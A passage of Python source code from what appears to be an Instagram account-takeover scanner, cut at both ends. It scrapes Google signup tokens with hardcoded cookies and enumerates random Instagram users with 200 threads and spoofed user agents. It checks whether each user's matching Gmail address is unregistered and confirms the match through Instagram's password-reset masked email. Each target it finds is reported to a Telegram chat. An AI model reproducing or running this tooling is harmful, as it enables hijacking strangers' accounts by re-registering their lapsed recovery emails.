        "Finlandiya": "\U0001f1eb\U0001f1ee", "Polonya": "\U0001f1f5\U0001f1f1",
        "Rusya": "\U0001f1f7\U0001f1fa", "Ukrayna": "\U0001f1fa\U0001f1e6",
        "Brezilya": "\U0001f1e7\U0001f1f7", "Meksika": "\U0001f1f2\U0001f1fd",
        "Hindistan": "\U0001f1ee\U0001f1f3", "Japonya": "\U0001f1ef\U0001f1f5",
        "G\u00fcney Kore": "\U0001f1f0\U0001f1f7", "Avustralya": "\U0001f1e6\U0001f1fa",
        "Kanada": "\U0001f1e8\U0001f1e6", "M\u0131s\u0131r": "\U0001f1ea\U0001f1ec",
        "Suudi Arabistan": "\U0001f1f8\U0001f1e6",
        "Birle\u015fik Arap Emirlikleri": "\U0001f1e6\U0001f1ea",
        "Katar": "\U0001f1f6\U0001f1e6", "Kuveyt": "\U0001f1f0\U0001f1fc",
        "\u0130ran": "\U0001f1ee\U0001f1f7", "Yunanistan": "\U0001f1ec\U0001f1f7",
        "Portekiz": "\U0001f1f5\U0001f1f9", "Romanya": "\U0001f1f7\U0001f1f4",
        "Bulgaristan": "\U0001f1e7\U0001f1ec", "Macaristan": "\U0001f1ed\U0001f1fa",
        "\u00c7ekya": "\U0001f1e8\U0001f1ff", "H\u0131rvatistan": "\U0001f1ed\U0001f1f7",
        "S\u0131rbistan": "\U0001f1f7\U0001f1f8", "Arnavutluk": "\U0001f1e6\U0001f1f1",
        "Kosova": "\U0001f1fd\U0001f1f0", "Malezya": "\U0001f1f2\U0001f1fe",
        "Singapur": "\U0001f1f8\U0001f1ec", "Tayland": "\U0001f1f9\U0001f1ed",
        "Vietnam": "\U0001f1fb\U0001f1f3", "Filipinler": "\U0001f1f5\U0001f1ed",
        "\u00c7in": "\U0001f1e8\U0001f1f3", "Hong Kong": "\U0001f1ed\U0001f1f0",
        "Tayvan": "\U0001f1f9\U0001f1fc", "G\u00fcrcistan": "\U0001f1ec\U0001f1ea",
        "Azerbaycan": "\U0001f1e6\U0001f1ff", "Kazakistan": "\U0001f1f0\U0001f1ff",
        "\u00d6zbekistan": "\U0001f1fa\U0001f1ff", "Pakistan": "\U0001f1f5\U0001f1f0",
        "Banglade\u015f": "\U0001f1e7\U0001f1e9", "Kolombiya": "\U0001f1e8\U0001f1f4",
        "\u015eili": "\U0001f1e8\U0001f1f1", "Peru": "\U0001f1f5\U0001f1ea",
        "Venezuela": "\U0001f1fb\U0001f1ea", "G\u00fcney Afrika": "\U0001f1ff\U0001f1e6",
        "Nijerya": "\U0001f1f3\U0001f1ec", "Kenya": "\U0001f1f0\U0001f1ea",
        "Fas": "\U0001f1f2\U0001f1e6", "Tunus": "\U0001f1f9\U0001f1f3",
        "Cezayir": "\U0001f1e9\U0001f1ff", "Libya": "\U0001f1f1\U0001f1fe",
        "Sudan": "\U0001f1f8\U0001f1e9", "Etyopya": "\U0001f1ea\U0001f1f9",
        "Gana": "\U0001f1ec\U0001f1ed", "Tanzanya": "\U0001f1f9\U0001f1ff",
        "Uganda": "\U0001f1fa\U0001f1ec", "Kamerun": "\U0001f1e8\U0001f1f2",
        "\u00dcrd\u00fcn": "\U0001f1ef\U0001f1f4", "L\u00fcbnan": "\U0001f1f1\U0001f1e7",
        "Suriye": "\U0001f1f8\U0001f1fe", "Yemen": "\U0001f1fe\U0001f1ea",
        "Umman": "\U0001f1f4\U0001f1f2", "Bahreyn": "\U0001f1e7\U0001f1ed",
        "\u0130srail": "\U0001f1ee\U0001f1f1", "Filistin": "\U0001f1f5\U0001f1f8",
        "Afganistan": "\U0001f1e6\U0001f1eb", "Sri Lanka": "\U0001f1f1\U0001f1f0",
        "Nepal": "\U0001f1f3\U0001f1f5", "Myanmar": "\U0001f1f2\U0001f1f2",
        "Kambo\u00e7ya": "\U0001f1f0\U0001f1ed", "Mo\u011folistan": "\U0001f1f2\U0001f1f3",
        "K\u0131rg\u0131zistan": "\U0001f1f0\U0001f1ec",
        "Tacikistan": "\U0001f1f9\U0001f1ef", "T\u00fcrkmenistan": "\U0001f1f9\U0001f1f2",
        "Yeni Zelanda": "\U0001f1f3\U0001f1ff", "\u0130rlanda": "\U0001f1ee\U0001f1ea",
        "Slovakya": "\U0001f1f8\U0001f1f0", "Slovenya": "\U0001f1f8\U0001f1ee",
        "Bosna Hersek": "\U0001f1e7\U0001f1e6", "Karada\u011f": "\U0001f1f2\U0001f1ea",
        "Kuzey Makedonya": "\U0001f1f2\U0001f1f0",
        "Moldova": "\U0001f1f2\U0001f1e9", "Belarus": "\U0001f1e7\U0001f1fe",
        "Litvanya": "\U0001f1f1\U0001f1f9", "Letonya": "\U0001f1f1\U0001f1fb",
        "Estonya": "\U0001f1ea\U0001f1ea", "L\u00fcksemburg": "\U0001f1f1\U0001f1fa",
        "Malta": "\U0001f1f2\U0001f1f9", "K\u0131br\u0131s": "\U0001f1e8\U0001f1fe",
        "\u0130zlanda": "\U0001f1ee\U0001f1f8", "Ermenistan": "\U0001f1e6\U0001f1f2",
        "Ekuador": "\U0001f1ea\U0001f1e8", "Bolivya": "\U0001f1e7\U0001f1f4",
        "Paraguay": "\U0001f1f5\U0001f1fe", "Uruguay": "\U0001f1fa\U0001f1fe",
        "K\u00fcba": "\U0001f1e8\U0001f1fa", "Dominik Cumhuriyeti": "\U0001f1e9\U0001f1f4",
        "Haiti": "\U0001f1ed\U0001f1f9", "Porto Riko": "\U0001f1f5\U0001f1f7",
        "Guatemala": "\U0001f1ec\U0001f1f9", "Honduras": "\U0001f1ed\U0001f1f3",
        "El Salvador": "\U0001f1f8\U0001f1fb", "Nikaragua": "\U0001f1f3\U0001f1ee",
        "Kosta Rika": "\U0001f1e8\U0001f1f7", "Panama": "\U0001f1f5\U0001f1e6",
        "Trinidad ve Tobago": "\U0001f1f9\U0001f1f9", "Jamaika": "\U0001f1ef\U0001f1f2",
    }
    if country_name in flags:
        return flags[country_name]
    cl = country_name.lower()
    for key in flags:
        if key.lower() in cl or cl in key.lower():
            return flags[key]
    return ""


# ── Google token helpers ──

def _m1_gtokens_background():
    time.sleep(60)
    while True:
        try:
            _m1_gtokens()
        except Exception:
            pass
        time.sleep(90)

def _m1_get_tl_background():
    while True:
        try:
            url    = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params = {'hl': "en-GB", '_reqid': "46000", 'rt': "j"}
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': "[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
                'gmscoreversion': "null", 'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301", 'checkedDomains': "youtube",
                'pstMsg': "1", '': ""
            }
            hdrs = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'x-same-domain': "1", 'google-accounts-xsrf': "1",
                'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
                'origin': "https://accounts.google.com",
                'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response = _m1__session.post(url, params=params, data=payload, headers=hdrs, timeout=20)
            tl_1 = json.loads(response.text[5:])[0][1][2]
            url2 = "https://accounts.google.com/_/signup/validatebasicinfo"
            p2   = {'hl': "en-GB", 'TL': tl_1, '_reqid': "346000", 'rt': "j"}
            pl2  = dict(payload)
            pl2['f.req'] = "[\"TL:"+ tl_1 +"\",2015,4,15,2,null,null,0,null,null,0,0]"
            hdrs['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl_1
            response2 = _m1__session.post(url2, params=p2, data=pl2, headers=hdrs, timeout=20)
            tl = json.loads(response2.text[5:])[0][0][4].split("TL:")[1]
            with open("google.txt", "w") as wf:
                wf.write(tl)
        except Exception:
            pass
        time.sleep(120)

def _m1_gtokens():
    max_retries = 2
    endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
    abc = 'abcdefghijklmnopqrstuvwxyz'
    for attempt in range(max_retries + 1):
        try:
            n1   = ''.join(choice(abc) for _ in range(randrange(6, 9)))
            n2   = ''.join(choice(abc) for _ in range(randrange(3, 9)))
            host = ''.join(choice(abc) for _ in range(randrange(15, 30)))
            hdrs = {
                'accept': '*/*', 'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': random.choice(_M1_USER_AGENTS)
            }
            res1 = requests.get(f"{_M1_CONFIG['google_url']}{endpoint}", headers=hdrs)
            if res1.status_code != 200:
                continue
            tok = re.search(
                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            )
            if not tok:
                continue
            tl = tok.group(2)
            cookies = {'__Host-GAPS': host}
            hdrs.update({
                'authority': 'accounts.google.com',
                'origin': _M1_CONFIG["google_url"],
                'referer': f"{_M1_CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
                'user-agent': random.choice(_M1_USER_AGENTS)
            })
            data = {
                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            response = requests.post(
                f"{_M1_CONFIG['google_url']}/_/signup/validatepersonaldetails",
                cookies=cookies, headers=hdrs, data=data
            )
            tl_new = response.text.split('",null,"')[1].split('"')[0] if '",null,"' in response.text else None
            if tl_new:
                tl = tl_new
            host = response.cookies.get_dict().get('__Host-GAPS', host)
            with open(_M1_CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return True
        except Exception:
            continue
    try:
        hdrs2 = {
            'accept': '*/*', 'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': random.choice(_M1_USER_AGENTS),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-same-domain': '1'
        }
        params2 = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
        em2   = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
        data2 = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{em2}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
        resp2 = requests.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params2, headers=hdrs2, data=data2
        )
        tl_match = re.search(r'"TL:([^"]+)"', resp2.text)
        if tl_match:
            tl   = tl_match.group(1)
            host = ''.join(choice(abc) for _ in range(randrange(15, 30)))
            with open(_M1_CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return True
    except Exception:
        pass
    return False


# ── Core scanning functions ──

def _m1_masked_matches_username(username, masked):
    """
    Return True only if the masked email from Instagram confirms it is
    username@gmail.com.

    Instagram masks like: shoping5857 → s*******7@gmail.com
    We verify:
      1. Domain is @gmail.com
      2. First visible char of masked local == first char of username
      3. Last visible char of masked local  == last  char of username
    """
    if not masked or '@' not in masked:
        return False
    local, domain = masked.lower().rsplit('@', 1)
    if 'gmail.com' not in domain:
        return False
    uname = username.lower()
    if not uname:
        return False
    # first char
    if local[0] != uname[0]:
        return False
    # last visible char (skip trailing asterisks)
    last_visible = None
    for ch in reversed(local):
        if ch != '*':
            last_visible = ch
            break
    if last_visible is None:
        return False
    if last_visible != uname[-1]:
        return False
    return True


def _m1_save_hit(username, user, token, chat_id):
    global _m1_hits, _m1_total, _m1_found_emails
    with _m1_hit_lock:
        user_id    = user.get('pk', 'Unknown')
        followers  = user.get('follower_count', 0)
        following  = user.get('following_count', 0)
        bio        = user.get('biography', 'None') or 'None'
        year_label = str(gdate(user_id))
        reset_text = _m1_rest_v1(username)

        # PRIMARY CHECK: Instagram password-reset endpoint.
        # If it returns a real masked email (not '-' / 'Fail:...') and that
        # masked email does NOT match username@gmail.com → not our target, skip.
        if (reset_text
                and reset_text not in ('-', '')
                and not reset_text.startswith('Fail:')
                and '@' in reset_text):
            if not _m1_masked_matches_username(username, reset_text):
                return

        about      = _m1_get_about_account(user_id, username)
        join_date  = about.get("join_date") or year_label
        _yr = re.search(r'\b(20\d{2})\b', join_date)
        if _yr:
            year_label = _yr.group(1)
        country_nm = about.get("country") or "-"
        country_fl = _m1_get_country_flag(country_nm)
        country    = f"{country_nm} {country_fl}".strip() if country_fl else country_nm
        former_raw = about.get("former_usernames", [])
        former     = ", ".join(former_raw) if former_raw else "-"
        masked, has_phone = _m1_get_masked(username)

        # Skip accounts with a phone number linked — not our target
        if has_phone:
            return

        # SECONDARY CHECK: GraphQL masked email.
        # Same logic — if it's present and doesn't match, skip.
        if masked:
            if not _m1_masked_matches_username(username, masked):
                return

        _m1_hits  += 1
        _m1_total += 1
        email_str = f"{username}@gmail.com"
        # Keep reset_text from _m1_rest_v1 as-is (accurate Instagram reset email).
        # Only fall back to email_str if the reset endpoint gave nothing useful.
        if not reset_text or reset_text in ('-', '') or reset_text.startswith('Fail:'):
            reset_text = email_str
        output = format_hit(
            hit_num    = _m1_hits,
            username   = username,
            email      = email_str,
            followers  = followers,
            following  = following,
            bio        = bio,
            year_label = year_label,
            reset_text = reset_text,
            join_date  = join_date,
            country    = country,
            masked     = masked,
            former     = former,
        )
        with _m1_found_lock:
            if email_str not in _m1_found_emails:
                _m1_found_emails.append(email_str)
        _send_telegram(token, chat_id, output)
        _save_hit_to_file(output)
        with _web_lock:
            _web_state['hits']  = _m1_hits
            _web_state['total'] = _m1_total

def _m1_cgmail(email, token, chat_id, user, loc_session):
    global _m1_bad_email, _m1_taken
    try:
        usr = email.split('@')[0] if '@' in email else email
        # Method 1: tokens.txt TL
        try:
            with open(_M1_CONFIG["token_file"], 'r') as f:
                line = f.read().splitlines()[0]
                tl, host = line.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com', 'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': _M1_CONFIG["form_type"],
                'google-accounts-xsrf': '1',
                'origin': _M1_CONFIG["google_url"],
                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                'user-agent': random.choice(_M1_USER_AGENTS)
            }
            params = {'TL': tl}
            data = (
                f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{usr}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
            )
            resp = loc_session.post(
                f"{_M1_CONFIG['google_url']}/_/signup/usernameavailability",
                params=params, cookies=cookies, headers=headers, data=data, timeout=8
            )
            if '"gf.uar",1' in resp.text:
                _m1_save_hit(usr, user, token, chat_id)
                return
        except Exception:
            pass
        # Method 2: google.txt TL
        try:
            with open("google.txt", "r") as ys:
                tl2 = ys.read().strip()
            url2    = "https://accounts.google.com/_/signup/usernameavailability"
            params2 = {'hl': "en-GB", 'TL': tl2, '_reqid': "446000", 'rt': "j"}
            data2   = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': "[\"TL:"+ tl2 +"\",\""+ usr +"\",0,0,1,null,1,2464]",
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
                'gmscoreversion': "null", 'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301", 'checkedDomains': "youtube",
                'pstMsg': "1", '': ""
            }
            hdrs2 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'x-same-domain': "1", 'google-accounts-xsrf': "1",
                'sec-ch-ua-mobile': "?1",
                'origin': "https://accounts.google.com",
                'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl2,
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            resp2 = _m1__session.post(url2, params=params2, data=data2, headers=hdrs2, timeout=8)
            if '"gf.uar",1' in resp2.text:
                _m1_save_hit(usr, user, token, chat_id)
                return
            else:
                _m1_taken += 1
        except Exception:
            _m1_taken += 1
        _m1_bad_email += 1
    except Exception:
        _m1_bad_email += 1

def _m1_cinstagram(email, token, chat_id, user, loc_session):
    global _m1_good_insta, _m1_bad_insta
    if _m1_lookup_instagram(email):
        _m1_good_insta += 1
        _m1_cgmail(email, token, chat_id, user, loc_session)
    else:
        _m1_bad_insta += 1

def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None):
    loc_session = _register_session(requests.Session())
    while not (stop_event and stop_event.is_set()):
        try:
            user_id    = random.randrange(min_id, max_id)
            rnd        = str(random.randint(2500000000, 21254029834))
            user_agent = (
                "Instagram 311.0.0.32.118 Android ("
                + ["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"][random.randint(0,5)]
                + "; " + str(random.randint(100,1300)) + "dpi; "
                + str(random.randint(200,2000)) + "x" + str(random.randint(200,2000)) + "; "
                + ["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"][random.randint(0,11)]
                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999)) + ")"
            )
            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(16))
            headers = {
                'accept': '*/*', 'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1', 'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': '{"userID":"' + str(user_id) + '","username":"cristiano"}',
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            global _m1_scanned
            _m1_scanned += 1
            resp = loc_session.post(_M1_CONFIG["insta_graphql"], headers=headers, data=data, timeout=10)
            if resp.status_code == 429:
                time.sleep(1)
                continue
            if resp.status_code != 200:
                time.sleep(0.1)
                continue
            user = resp.json().get('data', {}).get('user')
            if user and user.get('username'):
                followers = user.get('follower_count', 0)
                uid       = user.get('pk', 0)
                user_year = gdate(uid)
                if _M1_VIP_CONFIG["vip_date_min"] and user_year < _M1_VIP_CONFIG["vip_date_min"]:
                    continue
                if _M1_VIP_CONFIG["vip_date_max"] and user_year > _M1_VIP_CONFIG["vip_date_max"]:
                    continue
                if min_followers > 0 and followers < min_followers:
                    continue
                _m1_cinstagram(user['username'] + _M1_CONFIG["domain"], token, chat_id, user, loc_session)
        except Exception:
            time.sleep(0.05)
            continue


# ══════════════════════════════════════════════════════════
#  WEB ENTRY POINT  (called by app.py)
# ══════════════════════════════════════════════════════════

def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
    global _m1_hits, _m1_bad_insta, _m1_bad_email, _m1_good_insta
    global _m1_total, _m1_taken, _m1_limit, _m1_found_emails, _m1_scanned

    # Reset all counters
    _m1_hits = _m1_bad_insta = _m1_bad_email = _m1_good_insta = 0
    _m1_total = _m1_taken = _m1_limit = _m1_scanned = 0
    _m1_found_emails = []

    _write_session_separator(1)
    _web_state.update({
        'running': True, 'method': '1',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
    })

    if year_choice is not None:
        _M1_VIP_CONFIG["vip_date_min"] = year_choice
        _M1_VIP_CONFIG["vip_date_max"] = year_choice
    else:
        _M1_VIP_CONFIG["vip_date_min"] = 2010
        _M1_VIP_CONFIG["vip_date_max"] = 2019

    min_id, max_id = get_year_range(year_choice)

    # Start background helpers
    _m1_next_about_session()
    _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
    Thread(target=_m1_about_token_refresher, daemon=True).start()
    Thread(target=_m1_get_tl_background,     daemon=True).start()
    Thread(target=_m1_gtokens_background,    daemon=True).start()

    # Initial token fetch
    _m1_gtokens()

    NUM_WORKERS = 200
    try:
        while not stop_event.is_set():
            with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
                futures = [
                    executor.submit(_m1_sinsta, min_id, max_id, token, chat_id, min_followers, stop_event)
                    for _ in range(NUM_WORKERS)
                ]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
            if not stop_event.is_set():
                time.sleep(0.5)
    finally:
        _web_state['running'] = False


# ══════════════════════════════════════════════════════════════════════════════
#  METHOD 2  —  LIGHT SPEED SCANNER
# ══════════════════════════════════════════════════════════════════════════════

_m2_hits        = 0
_m2_bad_insta   = 0
_m2_bad_email   = 0
_m2_good_insta  = 0
_m2_total       = 0
_m2_taken       = 0
_m2_limit       = 0
_m2_scanned     = 0
_m2_found_emails: list = []
_m2_found_lock  = Lock()
_m2_hit_lock    = Lock()

_M2_TOKENS_FILE = "tokens_m2.txt"
_m2_web_session = requests.Session()
_m2__session    = requests.Session()

# ── Background: Google TL token refresher ──────────────────────────────────────

def _m2_get_tl():
    """Daemon: continuously refresh the Google TL token into google.txt."""
    while True:
        try:
            url    = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params = {'hl': "en-GB", '_reqid': "46000", 'rt': "j"}
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': "[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': ""
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
                'x-same-domain': "1",
                'google-accounts-xsrf': "1",
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': "\"Android\"",
                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
                'origin': "https://accounts.google.com",
                'x-client-data': "CP/xygE=",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response = _m2__session.post(url, params=params, data=payload, headers=headers, timeout=20)
            tl_1 = json.loads(response.text[5:])[0][1][2]

            url2    = "https://accounts.google.com/_/signup/validatebasicinfo"
            params2 = {'hl': "en-GB", 'TL': tl_1, '_reqid': "346000", 'rt': "j"}
            payload2 = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': "[\"TL:" + tl_1 + "\",2015,4,15,2,null,null,0,null,null,0,0]",
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': ""
            }
            headers2 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
                'x-same-domain': "1",
                'google-accounts-xsrf': "1",
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': "\"Android\"",
                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
                'origin': "https://accounts.google.com",
                'x-client-data': "CP/xygE=",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl_1,
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response2 = _m2__session.post(url2, params=params2, data=payload2, headers=headers2, timeout=20)
            tl = json.loads(response2.text[5:])[0][0][4].split("TL:")[1]
            with open("google.txt", "w") as w:
                w.write(tl)
        except Exception:
            pass
        time.sleep(30)


# ── Background: Instagram CSRF/LSD token refresher ────────────────────────────

def _m2_get_tokens():
    """Daemon: refresh Instagram csrf+lsd tokens into tokens_m2.txt."""
    while True:
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = _m2_web_session.get('https://www.instagram.com/', headers=headers, timeout=20)
            csrf = response.cookies.get('csrftoken', '')
            find = re.search(r'"LSD",\[\],\{"token":"(.*?)"\}', response.text)
            lsd  = find.group(1) if find else None
            if csrf and lsd:
                with open(_M2_TOKENS_FILE, "w") as fd:
                    fd.write(f"{csrf}|{lsd}")
        except Exception:
            pass
        time.sleep(90)


def _m2_load_tokens():
    """Load csrf|lsd from file, fall back to hardcoded defaults."""
    try:
        with open(_M2_TOKENS_FILE, 'r') as f:
            parts = f.read().strip().split('|')
            if len(parts) == 2 and parts[0] and parts[1]:
                return parts[0], parts[1]
    except Exception:
        pass
    return "bKPOnxXALzrHjjhgVUSXUWvsJSheI52L", "9CaKjXH_JGbfD4zZaTfZ8a"


# ── Bloks lookup ───────────────────────────────────────────────────────────────

def _m2_lookup(email, loc_session):
    """Bloks async search — returns True if email is linked to an IG account."""
    global _m2_good_insta, _m2_bad_insta, _m2_limit
    try:
        device  = str(uuid.uuid4())
        family  = str(uuid.uuid4())
        android = "android-" + secrets.token_hex(8)
        payload = {
            'params': (
                "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"
                + str(int(time.time()))
                + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4())
